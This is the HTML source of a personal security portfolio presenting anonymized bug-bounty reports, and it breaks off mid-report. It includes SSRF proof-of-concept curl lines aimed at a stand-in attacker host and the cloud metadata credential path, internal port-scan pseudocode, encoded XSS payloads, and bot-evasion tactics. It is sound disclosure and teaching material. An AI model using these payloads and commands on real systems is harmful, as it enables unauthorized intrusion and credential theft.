<!doctype html>
<html lang="en">
<head>
  <meta charset="utf-8" />
  <meta name="viewport" content="width=device-width,initial-scale=1" />
  <title>codenamevenom — Security Portfolio</title>
  <meta name="description" content="Technical portfolio of accepted and paid security reports — codenamevenom" />
  <link rel="stylesheet" href="https://cdnjs.cloudflare.com/ajax/libs/font-awesome/6.5.0/css/all.min.css">
  <link href="https://unpkg.com/aos@2.3.1/dist/aos.css" rel="stylesheet">
  <style>
    :root{
      --bg:#0b0f12;--card:#0f1620;--muted:#98a0aa;--accent:#ef4444;--glass:rgba(255,255,255,0.03);
      --text:#e6eef6;--light-bg:#f5f5f5;--light-card:#ffffff;--light-text:#222;--light-muted:#666
    }
    *{box-sizing:border-box;margin:0;padding:0}
    body{font-family:Inter,ui-sans-serif,system-ui,-apple-system,Segoe UI,Roboto,'Helvetica Neue',Arial;color:var(--text);background:var(--bg);overflow-x:hidden;display:flex;transition:background .3s,color .3s;min-height:100vh;flex-direction:row}
    body.light{background:var(--light-bg);color:var(--light-text)}

    /* sidebar */
    #sidebar{width:260px;min-height:100vh;background:#0f1620;display:flex;flex-direction:column;align-items:center;padding:30px 20px;box-shadow:4px 0 20px rgba(0,0,0,0.6);position:fixed;left:0;top:0;bottom:0;transition:background .3s}
    body.light #sidebar{background:#fff}
    #sidebar h2{margin-top:16px;font-size:20px;letter-spacing:1px;text-transform:uppercase;transition:color .3s, text-shadow .3s}
    #sidebar h2:hover{color:var(--accent);text-shadow:0 0 8px var(--accent)}
    #sidebar p{color:var(--muted);font-size:13px;margin-top:4px;text-align:center}
    #sidebar ul{list-style:none;margin-top:30px;width:100%}
    #sidebar ul li{margin:10px 0}
    #sidebar ul li a{color:inherit;text-decoration:none;display:flex;align-items:center;gap:10px;padding:10px;border-radius:8px;transition:background 0.3s}
    #sidebar ul li a:hover{background:rgba(239,68,68,0.1);color:var(--accent)}

    .sidebar-bottom{margin-top:auto;display:flex;gap:12px;align-items:center}
    .circle-icon{width:38px;height:38px;border-radius:50%;display:flex;align-items:center;justify-content:center;background:#1c2530;color:#aaa;cursor:pointer;transition:all .25s;font-size:18px}
    .circle-icon:hover{color:#fff;background:var(--accent)}
    body.light .circle-icon{background:#ddd;color:#444}

    /* ---------- AVATAR: single ring, full-load spin + hover scale ---------- */

.avatar-wrapper {
  position: relative;
  width: 140px;                /* desktop default */
  height: 140px;
  display: flex;
  align-items: center;
  justify-content: center;
  margin-bottom: 12px;
  user-select: none;
  outline: none;
}

/* single decorative ring (neon glow) */
.avatar-circle {
  position: absolute;
  inset: 0;
  border-radius: 50%;
  background: transparent;                      /* no inner fill */
  border: 4px solid rgba(239,68,68,0.18);       /* visible ring */
  box-shadow:
    0 0 20px rgba(239,68,68,0.08),
    0 0 40px rgba(239,68,68,0.12),
    0 0 8px rgba(0,0,0,0.45) inset;
  transition: transform 0.9s cubic-bezier(.2,.9,.2,1), box-shadow .45s ease;
  transform-origin: 50% 50%;
  pointer-events: none;
  will-change: transform, box-shadow;
}

/* symbol container (holds the svg/img emblem) */
.avatar-symbol {
  z-index: 2;
  display: flex;
  align-items: center;
  justify-content: center;
  width: 112px;
  height: 112px;
  color: var(--text);
  transition: transform .6s cubic-bezier(.18,.9,.25,1), color .35s ease;
  transform-origin: 50% 50%;
  will-change: transform;
  border-radius: 50%;
  overflow: hidden;
  background: transparent; /* remove inner ring/gradient to avoid double circle */
}

/* initial full spin and gentle scale on page load (class added by JS) */
.avatar-circle.spin-start { animation: circle-spin 900ms cubic-bezier(.2,.9,.2,1) 1 both; }
.avatar-symbol.spin-start { animation: symbol-spin 900ms cubic-bezier(.2,.9,.2,1) 1 both; }

/* svg/img fit */
.avatar-symbol svg,
.avatar-symbol img {
  width: 92%;
  height: 92%;
  display: block;
  object-fit: contain;
}

/* Hover / focus: scale symbol, slightly scale ring */
.avatar-wrapper:hover .avatar-symbol,
.avatar-wrapper:focus-within .avatar-symbol {
  transform: scale(1.16);
  filter: drop-shadow(0 0 12px var(--accent));
}

.avatar-wrapper:hover .avatar-circle,
.avatar-wrapper:focus-within .avatar-circle {
  transform: scale(1.08);
  box-shadow:
    0 0 25px rgba(239,68,68,0.35),
    0 0 55px rgba(239,68,68,0.5);
}

/* keyboard accessibility */
.avatar-wrapper:focus-visible {
  box-shadow: 0 0 0 6px rgba(239,68,68,0.06);
  border-radius: 16px;
}

/* Keyframes: circle full rotation & symbol spin */
@keyframes circle-spin {
  0%   { transform: rotate(0deg) scale(0.96); opacity: 0.9; }
  50%  { transform: rotate(180deg) scale(1.06); opacity: 1; }
  100% { transform: rotate(360deg) scale(1); opacity: 1; }
}
@keyframes symbol-spin {
  0%   { transform: rotate(0deg) scale(0.96); opacity: 0.9; }
  50%  { transform: rotate(180deg) scale(1.12); opacity: 1; }
  100% { transform: rotate(360deg) scale(1); opacity: 1; }
}

/* Respect reduced-motion */
@media (prefers-reduced-motion: reduce) {
  .avatar-circle, .avatar-symbol {
    transition: none !important;
    animation: none !important;
    transform: none !important;
  }
  .avatar-wrapper:hover .avatar-circle,
  .avatar-wrapper:hover .avatar-symbol { transform: none !important; box-shadow: 0 0 12px rgba(239,68,68,0.4) !important; }
}

/* ---------- MOBILE: sidebar to topbar + refined hamburger ---------- */
@media (max-width: 880px) {
  /* Sidebar diventa barra superiore */
  #sidebar {
    position: relative;
    width: 100%;
    height: auto;
    flex-direction: row;
    align-items: center;
    justify-content: space-between;
    padding: 10px 14px;
    box-shadow: none;
    z-index: 100;
  }

  /* Layout verticale: sidebar sopra, contenuto sotto */
  body { flex-direction: column; }

  /* Contenuto prende tutta la larghezza */
  #content {
    margin-left: 0 !important;
    max-width: 100%;
    padding: 18px;
  }

  /* Avatar ridotto */
  .avatar-wrapper { 
    width: 72px; 
    height: 72px; 
    margin-bottom: 0; 
  }
  .avatar-symbol { 
    width: 56px; 
    height: 56px; 
  }
  .avatar-symbol img, 
  .avatar-symbol svg { 
    width: 100%; 
    height: 100%; 
  }

  /* Nascondi titolo e sottotitolo per risparmiare spazio */
  #sidebar h2, 
  #sidebar p { 
    display: none; 
  }

  /* Bottone hamburger */
  .menu-toggle {
    background: transparent;
    border: 0;
    cursor: pointer;
    padding: 6px;
    margin-right: auto; /* lo mette a sinistra */
    display: flex;
    align-items: center;
    justify-content: center;
    z-index: 150;
  }
  .menu-toggle .hamburger {
    width: 20px;
    height: 2px;
    background: currentColor;
    position: relative;
    border-radius: 2px;
  }
  .menu-toggle .hamburger::before,
  .menu-toggle .hamburger::after {
    content: "";
    position: absolute;
    left: 0;
    width: 100%;
    height: 2px;
    background: currentColor;
    border-radius: 2px;
  }
  .menu-toggle .hamburger::before { top: -6px; }
  .menu-toggle .hamburger::after { top: 6px; }

  /* Menu mobile */
#sidebar ul {
  display: none;
  position: absolute;
  top: 100%;          /* subito sotto la barra */
  left: 0;
  right: 0;
  background: var(--card);
  padding: 12px;
  border-radius: 0 0 10px 10px;
  box-shadow: 0 8px 30px rgba(0,0,0,0.5);
}

#sidebar.open ul {
  display: block;
}


  /* Link nel menu mobile */
  #sidebar ul li a {
    display: block;
    padding: 10px;
    border-radius: 6px;
  }
  #sidebar ul li a:hover {
    background: rgba(239,68,68,0.1);
    color: var(--accent);
  }
}








    /* content */
#content{
  margin-left:260px;
  flex:1;
  padding:30px;
  max-width:calc(100% - 260px);
  display:flex;
  flex-direction:column;
  min-height:100vh;
}

/* section handling */
section{
  display:none;
  animation:fade .5s ease;
  min-height: calc(100vh - 80px);
  padding-bottom:20px;
}
section.active{
  display:block;           /* block va bene per contenuti verticali */
}

/* fade keyframes */
@keyframes fade{ from{opacity:0} to{opacity:1} }

/* home cards stacked + centered (robust & responsive) */
.stack{
  display:flex;
  flex-direction:column;
  align-items:center;
  gap:28px;                 /* meno gap per densità visiva migliore */
  margin-top:40px;
  width:100%;
  padding:0 12px;
}

/* Card: use full width up to a comfortable max-width.
   Prevent layout break from long tokens and code blocks. */
.card{
  width:100%;
  max-width:760px;         /* fixed comfortable width */
  background:var(--card);
  border-radius:14px;
  padding:20px;
  box-shadow:0 0 16px rgba(239,68,68,0.08);
  border:1px solid rgba(255,255,255,0.04);
  transition:transform .28s ease, box-shadow .28s ease, background .3s;
  cursor:pointer;
  word-break:break-word;   /* evita overflow da token lunghi */
  overflow:hidden;
  -webkit-font-smoothing:antialiased;
}

/* Hover state */
.card:hover{
  transform:translateY(-6px);
  box-shadow:0 18px 60px rgba(239,68,68,0.14);
  background:rgba(239,68,68,0.05);
}

/* Text inside card */
.card h3{ margin:0 0 8px 0; font-size:18px; line-height:1.2; }
.card p { margin:0; color:var(--muted); font-size:14px; }

/* Code / pre inside cards: allow wrapping and scrolling */
.card pre,
.card code {
  max-width:100%;
  white-space:pre-wrap;    /* consente wrapping nei blocchi codice */
  word-break:break-word;
  overflow-x:auto;
}

/* ensure inline code doesn't overflow */
.card p code, .card li code {
  background: rgba(255,255,255,0.04);
  padding:2px 6px;
  border-radius:4px;
  font-size:13px;
}

/* reports collapsible (minimal, GoDiego-style) */
.folder{
  background:var(--card);
  margin-bottom:12px;
  border-radius:8px;
  border:1px solid rgba(255,255,255,0.05);
  width:100%;
  max-width:760px;
  overflow:hidden;
}
.folder-header{
  padding:12px;
  cursor:pointer;
  font-weight:600;
  display:flex;
  align-items:center;
  gap:8px;
}
.folder-header:hover{ background:rgba(239,68,68,0.08) }
.folder-content{
  display:none;
  padding:0 18px 12px 18px;
}
.folder-content ul{ list-style:none; padding-left:0; margin:10px 0 0 0; }
.folder-content li{ margin:6px 0; font-size:14px; color:var(--muted); }
.folder-content a{ color:inherit; text-decoration:none; }
.folder-content a:hover{ color:var(--accent); }
body.light .folder{ background:var(--light-card); }


    /* about me */
    #about h2{font-family:Georgia,serif;font-size:26px;color:#e6eef6;margin-bottom:10px}
    #about p.intro{font-family:Georgia,serif;font-size:18px;color:#9bb0c8;margin-bottom:20px;min-height:30px}
    #about ul{list-style:disc;margin-left:20px;color:var(--muted)}
    body.light #about h2{color:#222}

    /* contact */
    #contact a{color:inherit;font-size:16px;text-decoration:none}
    #contact a:hover{color:var(--accent)}

    footer{text-align:center;color:var(--muted);font-size:13px;padding:20px;margin-top:auto}

  /* Report detail typography */
  #report-detail h1, 
  #report-detail h2, 
  #report-detail h3 {
    margin-top: 28px;
    margin-bottom: 14px;
    line-height: 1.3;
    color: #fff;
  }

  #report-detail h1 { font-size: 28px; color: var(--accent); }
  #report-detail h2 { font-size: 22px; color: #e6eef6; }
  #report-detail h3 { font-size: 18px; color: #cfd6df; }

  #report-detail p {
    margin-bottom: 16px;
    line-height: 1.6;
    color: #cfd6df;
  }

  #report-detail ul {
    margin: 12px 0 20px 20px;
    color: #cfd6df;
    line-height: 1.6;
  }

  #report-detail li { margin-bottom: 8px; }

  /* Code blocks */
  #report-detail pre {
    background: #1a1f26;
    border: 1px solid rgba(255,255,255,0.08);
    border-radius: 8px;
    padding: 14px;
    overflow-x: auto;
    margin: 16px 0;
  }
  #report-detail code {
    font-family: "Fira Code", monospace;
    font-size: 14px;
    color: #efefef;
  }

  /* Inline code */
  #report-detail p code, 
  #report-detail li code {
    background: rgba(255,255,255,0.08);
    padding: 2px 5px;
    border-radius: 4px;
    font-size: 13px;
  }

  /* Blockquote */
  #report-detail blockquote {
    border-left: 4px solid var(--accent);
    padding-left: 14px;
    color: #9bb0c8;
    margin: 18px 0;
    font-style: italic;
  }

  /* Better spacing between sections */
  #report-detail .post-content > * {
    margin-bottom: 20px;
  }
</style>
</head>
<body>
  <aside id="sidebar">
    <!-- START: avatar (replace the old avatar-wrapper block) -->
<!-- AVATAR: single-ring emblem -->
<div class="avatar-wrapper" title="codenamevenom" tabindex="0" aria-label="CodenameVenom avatar">
  <div class="avatar-circle" aria-hidden="true"></div>
  <div class="avatar-symbol" aria-hidden="false">
    <!-- img path: use repo root or assets/ as appropriate -->
    <img src="avatar-venom.svg" alt="CodenameVenom emblem" />
    <!-- If you prefer inline SVG, paste it here instead of <img> -->
  </div>
</div>


<!-- END: avatar -->

    <h2>CODENAMEVENOM</h2>
    <p>Cybersecurity Engineer · Offensive Researcher</p>
    <ul>
      <li><a href="#home" onclick="return showSection('home')"><i class="fa fa-home"></i> Home</a></li>
      <li><a href="#reports" onclick="return showSection('reports')"><i class="fa fa-list"></i> Reports</a></li>
      <li><a href="#about" onclick="return showSection('about')"><i class="fa fa-user"></i> About Me</a></li>
      <li><a href="#contact" onclick="return showSection('contact')"><i class="fa fa-envelope"></i> Contact</a></li>
    </ul>
    <div class="sidebar-bottom">
      <div id="mode-toggle" class="circle-icon" title="Toggle theme"><i class="fa fa-moon"></i></div>
      <a href="mailto:voxlab.services@gmail.com" class="circle-icon" title="Email"><i class="fa fa-envelope"></i></a>
    </div>
  </aside>

  <main id="content">
    <section id="home" class="active">
      <header data-aos="fade-down">
        <h1>Security Portfolio — Accepted & Paid Reports</h1>
        <p style="color:var(--muted)">Selection of anonymized reports demonstrating offensive security findings and impact.</p>
      </header>
      <div class="stack">
        <div class="card" data-aos="fade-up" onclick="openReport('ssrf')"><h3>SSRF — /api/og/statistic</h3><p>Parameter allowed internal network discovery via SSRF.</p></div>
        <div class="card" data-aos="fade-up" onclick="openReport('idor1')"><h3>IDOR — /api/Log</h3><p>Exposed unauthorized resources through weak access control.</p></div>
        <div class="card" data-aos="fade-up" onclick="openReport('logic')"><h3>Business Logic — Weak Email Validation</h3><p>Allowed automation and abuse of workflow.</p></div>
        <div class="card" data-aos="fade-up" onclick="openReport('access')"><h3>Improper Access Control — /register</h3><p>Registration endpoint abused without authorization.</p></div>
        <div class="card" data-aos="fade-up" onclick="openReport('xss')"><h3>DOM XSS — /user/auth/chooseschema</h3><p>Reflected DOM injection led to XSS.</p></div>
        <div class="card" data-aos="fade-up" onclick="openReport('idor2')"><h3>IDOR — /api/quotes/[UUID]/</h3><p>Predictable UUID exposed other users' data.</p></div>
        <div class="card" data-aos="fade-up" onclick="openReport('idor3')"><h3>IDOR — /v2/apps/[ID]/verification-methods</h3><p>Endpoint leaked verification methods of other users.</p></div>
      </div>
      <footer>© 2025 codenamevenom — All rights reserved</footer>
    </section>

    <section id="reports">
      <h2>Reports by Category</h2>
      <div class="folder"><div class="folder-header" onclick="toggleFolder(this)"><i class="fa fa-folder"></i> SSRF</div><div class="folder-content"><ul><li><a href="#" onclick="openReport('ssrf')">/api/og/statistic — Internal network SSRF</a></li></ul></div></div>
      <div class="folder"><div class="folder-header" onclick="toggleFolder(this)"><i class="fa fa-folder"></i> IDOR</div><div class="folder-content"><ul><li><a href="#" onclick="openReport('idor1')">/api/Log — Exposed unauthorized resources</a></li><li><a href="#" onclick="openReport('idor2')">/api/quotes/[UUID]/ — Predictable identifier leak</a></li><li><a href="#" onclick="openReport('idor3')">/v2/apps/[ID]/verification-methods — Leaked user verification methods</a></li></ul></div></div>
      <div class="folder"><div class="folder-header" onclick="toggleFolder(this)"><i class="fa fa-folder"></i> XSS</div><div class="folder-content"><ul><li><a href="#" onclick="openReport('xss')">/user/auth/chooseschema — DOM-based XSS</a></li></ul></div></div>
      <div class="folder"><div class="folder-header" onclick="toggleFolder(this)"><i class="fa fa-folder"></i> Business Logic</div><div class="folder-content"><ul><li><a href="#" onclick="openReport('logic')">Weak Email Validation — Workflow abuse</a></li></ul></div></div>
      <div class="folder"><div class="folder-header" onclick="toggleFolder(this)"><i class="fa fa-folder"></i> Access Control</div><div class="folder-content"><ul><li><a href="#" onclick="openReport('access')">/api/auth/local/register — Unauthorized registration</a></li></ul></div></div>
      <footer>© 2025 codenamevenom — All rights reserved</footer>
    </section>

    <section id="about">
      <h2>About Me</h2>
      <p class="intro" id="particleText"></p>
      <h3>Who am I?</h3>
      <ul>
        <li>Offensive Cybersecurity Researcher</li>
        <li>STEM Graduate</li>
        <li>eJPT holder, successfully achieved</li>
        <li>Currently preparing for OSCP</li>
      </ul>
      <footer>© 2025 codenamevenom — All rights reserved</footer>
    </section>

    <section id="contact">
      <h2>Contact</h2>
      <p><a href="mailto:voxlab.services@gmail.com">voxlab.services@gmail.com</a></p>
      <footer>© 2025 codenamevenom — All rights reserved</footer>
    </section>

    <section id="report-detail" aria-live="polite">
  <div style="max-width:900px;margin:0 auto;padding:20px;">
    <h2 id="report-title"></h2>
    <div id="report-body"></div>
  </div>
  <footer>© 2025 codenamevenom — All rights reserved</footer>
</section>

  </main>

  <script src="https://unpkg.com/aos@2.3.1/dist/aos.js"></script>
  <script>
    AOS.init({duration:700, once:false, offset:100});

    function showSection(id){
      document.querySelectorAll('main section').forEach(s=>s.classList.remove('active'));
      document.getElementById(id).classList.add('active');
      if(id==='about'){particleEffect();}
      return false;
    }

    function toggleFolder(header){
      const c=header.nextElementSibling;
      c.style.display = c.style.display==='block' ? 'none' : 'block';
    }

    document.getElementById('mode-toggle').onclick=function(){
      document.body.classList.toggle('light');
      this.innerHTML = document.body.classList.contains('light') ? '<i class="fa fa-sun"></i>' : '<i class="fa fa-moon"></i>';
    };

    function particleEffect(){
      const el=document.getElementById('particleText');
      const text="Driven by curiosity, I explore systems to strengthen their security while continuously learning.";
      if(!el) return;
      el.innerHTML='';
      [...text].forEach((ch,i)=>{
        const span=document.createElement('span');
        span.textContent= ch===' ' ? '\u00A0' : ch;
        span.style.opacity=0;
        span.style.display='inline-block';
        span.style.filter='blur(6px)';
        span.style.transform='translateY(6px)';
        span.style.transition=`opacity 0.35s ${i*40}ms, filter 0.35s ${i*40}ms, transform 0.35s ${i*40}ms`;
        el.appendChild(span);
      });
      requestAnimationFrame(()=>{
        el.querySelectorAll('span').forEach(s=>{s.style.opacity=1;s.style.filter='blur(0)';s.style.transform='translateY(0)';});
      });
    }

    function safeInjectReport(containerId, htmlContent) {
  const container = document.getElementById(containerId);
  if (!container) {
    console.error('Container not found:', containerId);
    return;
  }

  // Rimuovi eventuali tag <script> per sicurezza (basic)
  const stripped = String(htmlContent).replace(/<script[\s\S]*?>[\s\S]*?<\/script>/gi, '');

  // Inietta HTML sanitizzato (basic). Se vuoi maggiore sicurezza, integra DOMPurify.
  container.innerHTML = stripped;

  // Refresh AOS (se usi AOS)
  if (window.AOS && typeof AOS.refresh === 'function') {
    AOS.refresh();
  }

  // Prism highlight (se usi Prism)
  requestAnimationFrame(() => {
    if (window.Prism && typeof Prism.highlightAll === 'function') {
      Prism.highlightAll();
    }
  });
}



    function openReport(id){
  // Nascondi tutte le sezioni e mostra report-detail
  document.querySelectorAll('main section').forEach(s => s.classList.remove('active'));
  const reportSection = document.getElementById('report-detail');
  if(!reportSection) return false;
  reportSection.classList.add('active');

  const titleMap = {
    ssrf: "SSRF — /api/og/statistic",
    idor1: "IDOR — /api/Log",
    logic: "Business Logic — Weak Email Validation",
    access: "Improper Access Control — /register",
    xss: "DOM XSS — /user/auth/chooseschema",
    idor2: "IDOR — /api/quotes/[UUID]/",
    idor3: "IDOR — /v2/apps/[ID]/verification-methods"
  };

  // Aggiorna titolo SEMPRE
  const titleEl = document.getElementById('report-title');
  const bodyEl  = document.getElementById('report-body');
  if (titleEl) titleEl.textContent = titleMap[id] || "Report";
  if (!bodyEl) return false;

  // Contenuto dinamico
  if (id === 'ssrf') {
    const reportHtml = `
    <h1>SSRF — /api/og/statistic</h1>
    <p><strong>Summary:</strong> A server-side request forgery (SSRF) was discovered in an unauthenticated endpoint responsible for generating Open Graph images. The endpoint allowed arbitrary user-supplied URLs via the <code>image</code> GET parameter, which were fetched server-side and returned as a PNG. Due to the lack of input validation and network egress control, this resulted in a full SSRF primitive with deep internal reconnaissance capabilities.</p>

    <h2>Core Behaviors</h2>
    <ul>
      <li>Arbitrary external/internal URL fetching (unauthenticated)</li>
      <li>Followed HTTP redirects (302, 301)</li>
      <li>Synchronous blocking — remote response delays impacted backend response time</li>
      <li>Attacker-controlled content cached under application domain for 1 year</li>
      <li>Access to <code>169.254.169.254</code> (Instance Metadata Service)</li>
      <li><strong>Ability to scan internal IPs and discover open ports</strong></li>
    </ul>

    <h2>Internal Network Discovery</h2>
    <pre><code>for ip in 10.0.0.1 to 10.0.0.255:
  for port in [80,443,8080,8000,5000,3000]:
    image = f"http://{ip}:{port}/favicon.ico"
    response = GET /api/og/statistic?image={image}
    if HTTP 200 or non-empty PNG:
        log live host and port
    elif delay > 5s:
        mark as open|filtered</code></pre>

    <h2>IMDS Access</h2>
    <p>Direct access to the Instance Metadata Service (<code>169.254.169.254</code>) was confirmed:</p>
    <ul>
      <li><code>/latest/meta-data/</code> → 200 OK</li>
      <li><code>/latest/meta-data/instance-id</code> → valid instance ID</li>
      <li><code>/latest/meta-data/iam/security-credentials/</code> → accessible</li>
    </ul>

    <h2>PoC Examples</h2>
    <pre><code>curl -i 'https://target/api/og/statistic?image=https://attacker.oast.pro/poc.png'</code></pre>
    <pre><code>curl -i 'https://target/api/og/statistic?image=http://169.254.169.254/latest/meta-data/'</code></pre>

    <h2>Impact</h2>
    <ul>
      <li><strong>Full SSRF</strong> with internal IP scan</li>
      <li><strong>IMDS access</strong> → possible credential leak</li>
      <li><strong>Persistent cache</strong> of attacker-controlled resources</li>
      <li><strong>DoS</strong> via delayed responses</li>
    </ul>

    <h2>Recommended Remediation</h2>
    <ul>
      <li>Denylist/allowlist outbound requests</li>
      <li>Block private IP ranges</li>
      <li>Use async + timeouts</li>
      <li>Enable IMDSv2</li>
    </ul>
  `;
  safeInjectReport('report-body', reportHtml);
}

  
  else if (id === 'idor1') {
    
    const reportHtml = `
<div id="post-wrapper">
  <h1>IDOR Exploitation: Breaking Access Control in Action Logging</h1>
  <div class="post-meta text-muted">
    <span>Posted in <em>Offensive Security Research</em> · CVSS: <strong>High</strong></span>
  </div>

  <div class="post-content">
    <blockquote>
      <p>
        This article walks through a real-world penetration test finding: an Insecure Direct Object Reference (IDOR) in an action logging endpoint. 
        The case study highlights the importance of thorough mapping during pre-engagement, exploration of business logic paths, and the use of custom Python tooling to validate impact without touching third-party data.
      </p>
    </blockquote>

    <h2>Pre-Engagement: Mapping the Landscape</h2>
    <p>
      Every serious penetration test begins with reconnaissance. Before testing functionality, I invested time in mapping the endpoints exposed by the target system, comparing traffic flows against baseline expectations. 
      This mapping phase was crucial: it revealed patterns in action logging calls, including parameters that appeared sequential and predictable.
    </p>

    <h2>Exploration and Discovery</h2>
    <p>
      During exploration, I identified a logging endpoint responsible for tracking user actions. 
      The request body included an <code>id</code> parameter, which appeared to reference user membership or session identifiers. 
      Surprisingly, the server accepted arbitrary values without checking whether they belonged to the authenticated account.
    </p>

    <h2>Endpoint Behavior</h2>
    <pre><code>
POST /api/log?actionTag=send-invite
Body:
{
  "id": "100245",
  "actionTag": "send-invite",
  "metadata": { "origin": "personalArea" }
}
    </code></pre>

    <p>
      Regardless of ownership, the backend responded with:
    </p>
    <pre><code>
HTTP/2 200 OK
true
    </code></pre>

    <p>
      Non-authenticated requests correctly returned <code>403 Forbidden</code>, but authenticated requests with arbitrary IDs were always accepted.
    </p>

    <h2>Custom Python Tooling</h2>
    <p>
      To test this in a controlled and ethical manner, I developed a custom Python script. 
      The script attached to the browser via the Chrome DevTools Protocol, extracted my own valid JWT token and session cookies, and replayed the request sequence with manipulated IDs. 
      Instead of accessing or modifying third-party data, the script merely checked for <code>true</code> vs <code>false</code> responses. 
      This approach made it possible to systematically confirm the vulnerability while staying within scope and policy.
    </p>

    <pre><code class="language-python">
if r.status_code == 200 and "true" in r.text.lower():
    print(f"[VULNERABLE] id={test_id} accepted")
    </code></pre>

    <h2>Escalation Through Enumeration</h2>
    <p>
      Once the flaw was confirmed, I demonstrated how enumeration could escalate the issue. 
      By iterating over sequential <code>id</code> values, any logged-in user could inject spoofed actions tied to other accounts. 
      This does not expose personal data directly, but it pollutes the system’s business logic, audit trails, and potential reward mechanisms.
    </p>

    <h2>Business Impact</h2>
    <ul>
      <li>Audit records can be artificially manipulated</li>
      <li>Referral or incentive systems can be fraudulently triggered</li>
      <li>Authorization boundaries are broken at the API level</li>
      <li>Large-scale automated exploitation possible via ID enumeration</li>
    </ul>

    <h2>Why This Matters</h2>
    <p>
      Even without sensitive data leakage, this IDOR is significant. 
      Security is not only about protecting confidentiality but also about ensuring the integrity of business workflows. 
      Allowing unauthorized users to influence system logs or rewards undermines trust in the platform itself.
    </p>

    <h2>Mitigation Recommendations</h2>
    <ul>
      <li>Enforce strict server-side ownership validation for all identifiers</li>
      <li>Reject mismatched <code>id</code> values with <code>403 Forbidden</code></li>
      <li>Tie resource validation directly to authenticated user session IDs</li>
      <li>Apply defense-in-depth: log anomalies and enforce rate limits on action logging</li>
    </ul>

    <h2>Ethical Note</h2>
    <p>
      The testing was performed responsibly using my own account and credentials only. 
      No third-party data was accessed, extracted, or altered. 
      The purpose of this exploration was to highlight the weakness in access control logic and demonstrate safe validation practices.
    </p>
  </div>
</div>
    `;
  
     safeInjectReport('report-body', reportHtml);
  }
  // --- template placeholder per altri report ---
   // --- LOGIC (Weak Email Validation) ---
else if (id === 'logic') {
  const reportHtml = `
  <div class="post-content">
    <h1>Weak Email Validation & Lack of Anti-Automation Controls</h1>

    <p><strong>Summary:</strong> During a security assessment of a public newsletter subscription API, I identified weak server-side email validation coupled with the absence of anti-automation controls. Two obfuscated payloads bypassed validation and were accepted with <code>200 OK</code>, while the API allowed high-volume submissions without rate-limiting or bot mitigation. The combination enables dataset poisoning, large-scale automated abuse and downstream failures.</p>

    <div class="post-meta"><strong>Context:</strong> CVSS: <strong>High</strong> — Anonymous disclosure / responsible testing.</div>

    <h2>Pre-Engagement & Mapping</h2>
    <p>Before any active testing, I performed systematic mapping of the public surface: enumerated endpoints, compared request/response patterns from the client application, and identified the newsletter subscribe endpoint. This allowed safe, non-destructive tests limited to in-scope behavior.</p>

    <h2>Exploration & Discovery</h2>
    <p>Initial tests showed most malformed inputs were rejected (<code>400/403</code>). However, two obfuscation techniques — URL-encoded payloads containing encoded markup characters — were accepted. The endpoint also lacked rate limits, CAPTCHA, and verification (no double opt-in).</p>

    <h2>Endpoint behaviour (anonymized)</h2>
    <pre><code class="language-bash">
POST https://&lt;media-host&gt;/api/newsletter/subscribe
Body:
{ "email": "&lt;payload&gt;" }
    </code></pre>

    <h2>Bypassing payloads (examples)</h2>
    <ul>
      <li><code>%22%3E%3Csvg%2Fonload%3Dalert(1)%3E%22@example.com</code></li>
      <li><code>test+%22%3E%3Cimg%20src%3Dx%20onerror%3Dalert(1)%3E@example.com</code></li>
    </ul>

    <h2>Proof of Concept — Controlled, Non-Destructive</h2>

    <h3>PoC 1 — Filter bypass & mass submission</h3>
    <ol>
      <li>Construct obfuscated payloads.</li>
      <li>POST each payload to the subscribe endpoint with standard headers.</li>
      <li>Log acceptance (200) vs blocked (400/422/403).</li>
      <li>Throttle to avoid service disruption (e.g. 0.3–0.5s).</li>
    </ol>
    <p>Outcome: multiple encoded payloads were accepted as valid subscriptions; the test does not read or modify third-party records.</p>

    <h3>PoC 2 — Oracle enumeration via response timing/behaviour</h3>
    <ol>
      <li>Create crafted variants (subaddressing, encoded suffixes).</li>
      <li>POST crafted address and observe response code/timing.</li>
      <li>Repeat/resend to infer storage/deduplication semantics.</li>
    </ol>
    <p>Outcome: response differences allow building an oracle for large-scale enumeration.</p>

    <h2>Automation & Evasion Techniques</h2>
    <ul>
      <li>IP rotation (proxy pools)</li>
      <li>User-Agent and fingerprint spoofing</li>
      <li>Cookie reuse and parallel workers</li>
    </ul>

    <h2>Attack scenarios & Business impact</h2>
    <ul>
      <li><strong>Data poisoning</strong>: malformed/ malicious entries propagate downstream.</li>
      <li><strong>Downstream failures</strong>: exports, parsers and integrations may break.</li>
      <li><strong>Enumeration & verification</strong>: oracle enables large-scale validation of lists.</li>
    </ul>

    <h2>Recommended mitigations</h2>
    <ul>
      <li>Strict RFC-compliant server-side email validation.</li>
      <li>Input normalization/decoding before validation and storage.</li>
      <li>Rate limiting (per IP/account) and progressive throttling.</li>
      <li>Anti-automation controls (CAPTCHA / challenge) for public flows.</li>
      <li>Double opt-in before persisting or forwarding to third parties.</li>
    </ul>

    <blockquote>
      <p>All tests were conducted ethically, using only synthetic inputs and test accounts where required.</p>
    </blockquote>

    <h2>Appendix — Safe PoC Patterns (conceptual)</h2>
    <pre><code class="language-bash">
payloads = [
  "%22%3E%3Csvg%2Fonload%3Dalert(1)%3E%22@example.com",
  "test+%22%3E%3Cimg%20src%3Dx%20onerror%3Dalert(1)%3E@example.com"
]

for p in payloads:
  resp = POST "https://&lt;media-host&gt;/api/newsletter/subscribe" with json {"email": p}
  log(p, resp.status_code)
  sleep(0.3)
    </code></pre>
  </div>
  `;

  safeInjectReport('report-body', reportHtml);
}

// --- ACCESS (Improper Access Control / registration) ---
else if (id === 'access') {
  const reportHtml = `
  <div class="post-content">
    <h1>Forensic Report — Improper Access Control on Registration API</h1>

    <p><strong>Executive summary:</strong> During a targeted assessment I identified a registration endpoint that issues confirmed accounts and valid JWTs immediately after an unauthenticated POST. The flow lacks verification (email/CAPTCHA), rate limiting, and origin restrictions. Public frontend artifacts and admin routes were also discovered, enabling reconnaissance chaining. All hosts and identifiers are anonymized.</p>

    <div class="post-meta"><strong>Context:</strong> CVSS: <strong>High</strong> — Responsible disclosure; anonymized evidence.</div>

    <h2>Pre-engagement & Rules</h2>
    <p><strong>Scope:</strong> public API & frontend assets only. No social engineering or destructive actions performed.</p>

    <h2>Information gathering</h2>
    <ol>
      <li>Passive collection: crawl public pages and inspect served JS bundles.</li>
      <li>Fingerprinting: modules and plugin names from bundles.</li>
      <li>Surface mapping: API endpoints and admin routes observable without auth.</li>
    </ol>

    <h2>Recon / Mapping results (anonymized)</h2>
    <pre><code class="language-bash">
POST https://&lt;api-host&gt;/api/auth/local/register
GET  https://&lt;api-host&gt;/api/users/me
GET  https://&lt;api-host&gt;/admin
